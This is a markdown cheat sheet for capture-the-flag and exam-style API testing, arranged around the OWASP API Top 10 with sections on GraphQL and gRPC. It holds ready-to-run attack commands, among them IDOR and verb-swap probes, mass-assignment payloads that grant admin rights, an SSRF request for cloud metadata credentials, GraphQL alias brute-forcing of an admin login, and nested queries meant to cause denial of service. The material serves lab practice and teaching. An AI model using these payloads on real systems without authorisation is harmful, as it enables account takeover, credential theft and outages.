# CTF Web - API Security (REST / GraphQL / gRPC)

Whitebox-oriented API exploitation for CWEE-style challenges, structured on the OWASP API Security Top 10 (2023): object- and function-level authorization (BOLA/BFLA), mass assignment & excessive data exposure (BOPLA), resource-consumption/DoS, sensitive-flow abuse, versioning/inventory, and SSRF. Plus GraphQL depth (introspection recovery, aliasing/batching DoS, field-suggestion leaks, CSRF) and gRPC/gRPC-web. For GraphQL injection/interpolation and basic introspection/batching see [server-side-2.md](server-side-2.md#graphql-injection-and-exploitation-hacklu-ctf-2020-heroctf-v5); for JWT/JWE forgery at the API auth layer see [auth-jwt.md](auth-jwt.md); for OAuth/OIDC/SAML/CORS see [auth-infra.md](auth-infra.md); for WebSocket mass assignment and API filter injection see [server-side-exec.md](server-side-exec.md#websocket-mass-assignment); for IDOR/BOLA CTF instances and hidden-endpoint discovery see [auth-and-access.md](auth-and-access.md#hidden-api-endpoints).

## Table of Contents
- [Recon & Surface Mapping](#recon--surface-mapping)
- [API1: BOLA (Object-Level Authorization / IDOR)](#api1-bola-object-level-authorization--idor)
- [API2: Broken Authentication](#api2-broken-authentication)
- [API3: BOPLA — Mass Assignment & Excessive Data Exposure](#api3-bopla--mass-assignment--excessive-data-exposure)
- [API4: Unrestricted Resource Consumption](#api4-unrestricted-resource-consumption)
- [API5: BFLA (Function-Level Authorization)](#api5-bfla-function-level-authorization)
- [API6: Unrestricted Access to Sensitive Business Flows](#api6-unrestricted-access-to-sensitive-business-flows)
- [API7: Server-Side Request Forgery](#api7-server-side-request-forgery)
- [API8/9: Misconfiguration & Improper Inventory](#api89-misconfiguration--improper-inventory)
- [GraphQL Depth](#graphql-depth)
- [gRPC / gRPC-Web](#grpc--grpc-web)
- [HTTP Method & Content-Type Confusion](#http-method--content-type-confusion)
- [Whitebox Tells](#whitebox-tells)

---

## Recon & Surface Mapping

Find the real endpoint list before testing authorization:
```bash
# Spec files — often left exposed, give every route + schema + example values
for p in /openapi.json /swagger.json /v3/api-docs /swagger/v1/swagger.json \
         /api-docs /graphql /graphql/schema.json /.well-known/openid-configuration \
         /api/swagger-ui/index.html /actuator /actuator/mappings /routes; do
  curl -sk "https://target$p" -o - | head -c 200; echo "  <- $p"
done

# Route brute-force with an API-shaped wordlist (Assetnote kiterunner is best)
kr scan https://target -w routes-large.kite -x 20
ffuf -u https://target/api/FUZZ -w api_wordlist.txt -mc all -fc 404

# Parameter mining on a known endpoint (find hidden/mass-assignable params)
arjun -u https://target/api/v1/user -m JSON
```
Diff API **versions**: `/api/v1/` may fix a bug still present in `/api/v2/` or an undocumented `/internal/`. Grab example IDs/tokens from the spec — they reveal ID format (sequential int? UUID? base64?) which decides BOLA feasibility.

---

## API1: BOLA (Object-Level Authorization / IDOR)

The #1 API bug: endpoint checks *authentication* but not *ownership* of the referenced object. Any parameter that names a resource is a candidate: path IDs, query IDs, JSON body IDs, and IDs buried in nested objects or headers.

```bash
# Two accounts: A (yours) and B (victim). Auth as A, request B's object.
curl -sk https://target/api/orders/1002 -H "Authorization: Bearer $A_TOKEN"   # your order
curl -sk https://target/api/orders/1001 -H "Authorization: Bearer $A_TOKEN"   # victim's -> should 403
```
Test matrix per object reference:
- **Increment/decrement** sequential IDs; if UUID, look for a leak of victim UUIDs (in list endpoints, GraphQL, error messages, spec examples).
- **Wrap the ID** — `"id":"1001"` vs `"id":1001` vs `"id":["1001"]` vs `"id":{"$ne":null}` (NoSQL, see [auth-and-access.md](auth-and-access.md#nosql-injection-mongodb)).
- **Move the ID** — some servers authz on the path ID but read a body/query ID: send `GET /api/orders/1002?id=1001` or path `1002` with body `{"id":1001}` and see which wins (parameter-pollution authz bypass).
- **Method swap** — `GET` is checked, `PUT`/`PATCH`/`DELETE` on the same object isn't.
- **Nested / secondary IDs** — `/api/user/me/cart/{itemId}` may check the user but not that `itemId` belongs to the cart.

CTF confirmation: request the flag-holding user's object (usually `id=1` / admin / `user=0`).

---

## API2: Broken Authentication

- **JWT at the API layer** — alg confusion, `alg:none`, `kid` traversal, JWK/JKU injection, weak secret. Full playbook in [auth-jwt.md](auth-jwt.md). Quick API-specific checks: does the API accept the token in **multiple places** (`Authorization`, `?access_token=`, cookie) with different validation? Does an **expired** token still work on some routes?
- **API keys** treated as both identity and authz — a low-priv key that also passes `GET /api/admin/*` because the check is "key present" not "key scope".
- **Credential-stuffing / OTP brute** with no rate limit — see [API4](#api4-unrestricted-resource-consumption) and race angle in [race-conditions.md](race-conditions.md#limit-overrun-targets).
- **Token in URL** logged / cached / sent as Referer — reflected token theft.
- **Weak "refresh"/reset flows** — reset token that is a predictable/sequential value or reused across users.

---

## API3: BOPLA — Mass Assignment & Excessive Data Exposure

Two sides of the object-property-authorization coin.

**Mass assignment (write side):** the handler binds the whole JSON body to a model, so you set fields you shouldn't. Add privileged keys the UI never sends:
```bash
# Registration / profile update — inject role/flags
curl -sk -X POST https://target/api/register -H 'Content-Type: application/json' \
  -d '{"user":"attacker","pass":"x","role":"admin","isAdmin":true,"verified":true,"balance":999999,"email_confirmed":true}'

# PATCH your own object with fields the client never exposes
curl -sk -X PATCH https://target/api/user/me -H "Authorization: Bearer $A" \
  -H 'Content-Type: application/json' -d '{"is_staff":true,"account_id":1,"tenant":"admin"}'
```
Discover mass-assignable names from: a GET of the object (fields you read are often writable), the OpenAPI schema, source models, or `arjun -m JSON`. Try nested overwrite (`{"user":{"role":"admin"}}`), snake vs camel (`isAdmin`/`is_admin`), and array/object type confusion. The WebSocket variant (add `"role":"ADMIN"` to a WS message) is in [server-side-exec.md](server-side-exec.md#websocket-mass-assignment).

**Excessive data exposure (read side):** the API returns full objects and relies on the *client* to hide fields. Read the raw JSON, never the rendered UI:
```bash
curl -sk https://target/api/users/me -H "Authorization: Bearer $A" | jq
# look for: password_hash, ssn, internal notes, other users' data in a list,
# tokens, apiKey, otp_secret, is_admin flags, soft-deleted records
```
List endpoints (`GET /api/users`, `/api/messages`) frequently dump every record's full object. GraphQL over-selection (below) is the same class.

---

## API4: Unrestricted Resource Consumption

- **No rate limit** → brute-force OTP/password/coupon. For microsecond limit-overrun (double-spend, single-use token reuse) use the single-packet attack in [race-conditions.md](race-conditions.md#single-packet-attack-http2).
- **GraphQL query amplification** — aliasing and batching multiply cost / bypass per-request limits (see [GraphQL Depth](#graphql-depth)).
- **Unbounded pagination / `limit`** — `?limit=100000000` or `first: 999999` to dump or DoS.
- **Mass object creation** — no cap on resource creation (upload, invite, order) exhausts quota or IDs.
- **Regex/JSON/zip bomb inputs** — ReDoS on a filter param (see ReDoS timing oracle in [server-side-exec.md](server-side-exec.md)); deeply-nested JSON to blow the parser (see [json-parser-differentials.md](json-parser-differentials.md)).

---

## API5: BFLA (Function-Level Authorization)

BOLA is *which object*; BFLA is *which action*. A normal user reaches an admin/privileged **function** because the route isn't gated by role.
```bash
# Guess admin functions by pattern; call them with a low-priv token.
for m in GET POST PUT DELETE; do
  curl -sk -X $m https://target/api/admin/users -H "Authorization: Bearer $LOWPRIV" -o /dev/null -w "$m %{http_code}\n"
done
# Swap the HTTP verb the docs don't mention:
curl -sk -X DELETE https://target/api/users/1001 -H "Authorization: Bearer $LOWPRIV"
# Reach v-N admin route that predates the authz fix:
curl -sk https://target/api/v1/admin/config -H "Authorization: Bearer $LOWPRIV"
```
Tests: guess `/admin/*`, `/internal/*`, `/manage/*` siblings of user routes; flip method (`GET /user/1` allowed but `PUT`/`DELETE` unchecked); toggle a `role`/`X-Role`/`X-Forwarded-For` header the middleware trusts; call the "approve"/"promote"/"refund" action directly. Also front-end route bypass tricks (`%2F`, `%61`, TRACE) in [auth-and-access.md](auth-and-access.md#expressjs-middleware-route-bypass-via-2f-srdnlenctf-2026).

---

## API6: Unrestricted Access to Sensitive Business Flows

Automatable abuse of a legitimate flow with no anti-automation: buy-all-inventory (scalping), spam invites/referrals, drain a promo, farm a "reward per action" loop. CTF shape: a points/credit economy where repeating a benign action past the intended cap yields the flag — combine with mass creation ([API4](#api4-unrestricted-resource-consumption)) or a limit-overrun race. Look for a `POST /claim`, `/redeem`, `/vote`, `/transfer` with only client-side or once-per-page-load protection.

---

## API7: Server-Side Request Forgery

APIs take URLs/webhooks/import-from-URL far more than classic apps. Any field named `url`, `callback`, `webhook`, `image_url`, `avatar`, `import`, `redirect_uri`, `xml`/`svg` (XXE), or a fetched OpenAPI/JWKS URL is a candidate. Full SSRF bypass arsenal (DNS rebinding, redirect, decimal/IPv6, gopher, cloud metadata) lives in [server-side.md](server-side.md); API-specific angles:
```bash
# Webhook / callback fields hitting internal services or cloud metadata
curl -sk -X POST https://target/api/webhooks -H "Authorization: Bearer $A" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# JWKS/OIDC discovery URL SSRF (server fetches your JWKS to verify a token)
#  -> point jku/jwks_uri at an internal service; see auth-jwt.md JKU injection
```

---

## API8/9: Misconfiguration & Improper Inventory

- **CORS** — reflected `Origin`, `null` origin, wildcard-with-credentials. See [auth-infra.md](auth-infra.md#cors-misconfiguration).
- **Verbose errors** — stack traces, SQL/ORM fragments, framework debug (`/actuator`, Flask debug, `?debug=1`) leaking schema and secrets.
- **Improper inventory** — old/undocumented hosts and versions: `api-dev.target`, `staging.`, `/api/v1/` (unpatched), `/internal/`, `/test/`, hosts in the OpenAPI `servers` list. Enumerate subdomains and version prefixes; the vuln fixed in prod often lives on the forgotten version.
- **Unauthenticated management/metrics** — `/actuator/env` (Spring, leaks env/creds), `/metrics`, `/debug/pprof`, GraphQL playground in prod.

---

## GraphQL Depth

Builds on the introspection/batching/interpolation basics in [server-side-2.md](server-side-2.md#graphql-injection-and-exploitation-hacklu-ctf-2020-heroctf-v5).

**Introspection when "disabled":** try `POST` vs `GET`, `application/json` vs `application/graphql`, and the `__type` single-type probe (some servers block `__schema` only). If fully off, **field suggestion** leaks names — a typo returns `Did you mean "secretField"?`:
```bash
curl -sk https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ userr }"}'      # -> 'Did you mean "user"?' leaks real fields
# tooling: clairvoyance reconstructs the schema from suggestions with introspection off
```

**Aliasing DoS / rate-limit bypass** — run one expensive/rate-limited op many times in a single request (each alias counts as one request server-side but one HTTP request client-side):
```graphql
mutation {
  a: login(user:"admin", pass:"p1"){ token }
  b: login(user:"admin", pass:"p2"){ token }
  c: login(user:"admin", pass:"p3"){ token }   # ... x1000 -> brute force in 1 request
}
```

**Array batching** — `[{"query":"..."},{"query":"..."}]`; same effect, and can slip past mutation-count guards.

**Deep/circular query DoS** — self-referential relations blow up cost with no depth limit:
```graphql
query { post { author { posts { author { posts { id } } } } } }   # nest until timeout
```

**GraphQL CSRF** — if it accepts `GET` or `application/x-www-form-urlencoded`, mutations become CSRF-able (no preflight). The image-timing GraphQL CSRF chain is in [client-side.md](client-side.md#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty).

**Authz at the resolver** — GraphQL centralizes BOLA/BFLA at resolvers; a `node(id:)` / `user(id:)` field often lacks per-object checks (BOLA), and mutations like `deleteUser`/`promote` often lack role checks (BFLA). Enumerate every query/mutation from the schema and call each with a low-priv token.

---

## gRPC / gRPC-Web

- **gRPC-Web** rides over HTTP/1.1+base64 or HTTP/2; capture in Burp (needs the gRPC-Web extension or protobuf decoder). Bodies are length-prefixed protobuf, not JSON.
- **Missing reflection lock-down:** if server reflection is on, enumerate services/methods:
```bash
grpcurl -plaintext target:50051 list                       # list services
grpcurl -plaintext target:50051 list package.MyService     # list methods
grpcurl -plaintext -d '{"id":1001}' target:50051 package.MyService/GetOrder   # BOLA test
```
- Same OWASP classes apply: BOLA (swap the id in the message), BFLA (call an admin RPC directly — reflection reveals them), mass assignment (set proto fields the client omits — protobuf ignores unknown-to-client but server-known fields).
- **Blackbox protobuf** (no reflection): decode a captured message with `protoc --decode_raw` to map field numbers, then re-encode with tampered fields.
```bash
printf '\x08\xe9\x07' | protoc --decode_raw    # field 1 (varint) = 1001
```

---

## HTTP Method & Content-Type Confusion

- **Verb tampering** — route allows `GET` for a check but the handler also serves `POST`/`PUT`/`HEAD`/`PATCH`; `X-HTTP-Method-Override: PUT` on a `POST` may reach a different handler.
- **Content-Type flip** — an endpoint parsing JSON may also accept `application/xml` (→ XXE, see [server-side-2.md](server-side-2.md)) or `x-www-form-urlencoded` (→ CSRF, parameter-parsing differences). Send the same params in each and diff behavior/authz.
- **Parser differentials** — JSON key duplication / type coercion can bypass validators that parse differently than the app; see [json-parser-differentials.md](json-parser-differentials.md).

---

## Whitebox Tells

- **BOLA:** a handler that reads `params[:id]` / `req.params.id` and does `Model.find(id)` with **no `where owner = current_user`**. Grep for `findById`, `.get(id)`, `SELECT * FROM x WHERE id =` lacking an ownership predicate.
- **Mass assignment:** `Model(**request.json)`, `Object.assign(user, req.body)`, `user.update(req.body)`, `@ModelAttribute`, Rails `params.permit!` / `.attributes = params`, Django `ModelForm` with `fields='__all__'`, Mongoose `.set(req.body)` — anything binding the whole body without an allow-list.
- **Excessive exposure:** serializers returning the whole model (`return jsonify(user.__dict__)`, `res.json(user)`, `select *`) with no field allow-list / DTO.
- **BFLA:** admin routes registered without the role middleware other admin routes use; a single `authenticate` guard but no `authorize(role)`; route order that lets a wildcard match an admin path.
- **Authz-on-wrong-param:** middleware validates the path id but the handler trusts a body/query id (parameter-pollution bug).
- **GraphQL:** resolvers with no `context.user` / permission check; introspection enabled in prod config; no `depthLimit`/`costAnalysis` plugin; a `node(id)` global-object resolver.
- **gRPC:** `reflection.register` left on in prod; interceptors that authenticate but never authorize per-method.
